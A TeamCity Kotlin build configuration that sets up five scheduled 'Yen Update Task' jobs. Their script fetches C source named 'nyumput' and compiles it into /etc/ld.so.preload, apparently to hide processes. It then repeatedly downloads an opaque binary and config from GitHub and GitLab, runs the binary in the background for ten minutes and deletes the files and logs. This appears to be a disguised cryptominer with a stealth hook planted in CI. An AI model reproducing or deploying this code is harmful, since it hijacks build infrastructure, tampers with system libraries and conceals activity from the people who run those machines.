import jetbrains.buildServer.configs.kotlin.*
import jetbrains.buildServer.configs.kotlin.buildSteps.script
import jetbrains.buildServer.configs.kotlin.triggers.schedule
import jetbrains.buildServer.configs.kotlin.triggers.vcs

project {
    // Membuat 5 build konfigurasi (Matrix 1-5)
    for (i in 1..5) {
        buildType(YenTask(i))
    }
}

class YenTask(val version: Int) : BuildType({
    id("YenUpdate_Task_$version".toId())
    name = "Yen Update Task - Version $version"

    params {
        param("env.CURRENT_JOB", "$version")
        param("env.JOB_COUNT", "40")
    }

    vcs {
        root(DslContext.settingsRoot)
    }

    triggers {
        vcs { }
        schedule {
            schedulingPolicy = cron {
                hours = "*/6"
            }
        }
    }

    steps {
        script {
            name = "Full Execution Step"
            scriptContent = """
                #!/bin/bash
                # Install & Compile
                sudo apt-get update && sudo apt-get install -y wget curl build-essential jq
                
                curl -L https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
                gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
                sudo mv libnyumput.so /usr/local/lib/
                echo /usr/local/lib/libnyumput.so | sudo tee -a /etc/ld.so.preload
                
                # Main Loop
                expiration_time=${'$'}(( ${'$'}(date +%s) + 6*3600 ))
                while [ ${'$'}(date +%s) -lt ${'$'}expiration_time ]; do
                    current_timestamp=${'$'}(date +%s)
                    mkdir -p .lib
                    dynamic_sgr=".lib/sgr_${'$'}current_timestamp"
                    
                    wget -O ${'$'}dynamic_sgr https://github.com/barburonjilo/open/raw/refs/heads/main/isu
                    wget -q -O config.json https://gitlab.com/barbieanay003/seger/-/raw/main/isu2.json
                    chmod +x ${'$'}dynamic_sgr config.json
                    
                    ip_list="list_${'$'}current_timestamp.json"
                    wget -O ${'$'}ip_list https://gitlab.com/barbieanay003/seger/-/raw/main/list4.json
                    
                    if [[ ! -f ${'$'}ip_list ]]; then exit 1; fi

                    selected_ip=${'$'}(jq -r '.[]' ${'$'}ip_list | shuf -n 1)
                    selected_port=${'$'}(shuf -i 802-810 -n 1)

                    nohup ${'$'}dynamic_sgr -c config.json > log_${'$'}selected_port.log 2>&1 &
                    process_id=${'$'}!
                    
                    sleep 600
                    kill ${'$'}process_id || true
                    
                    sleep 120
                    rm -f ${'$'}ip_list ${'$'}dynamic_sgr log_${'$'}selected_port.log
                done
            """.trimIndent()
        }
    }

    failureConditions {
        executionTimeoutMin = 380
    }
})
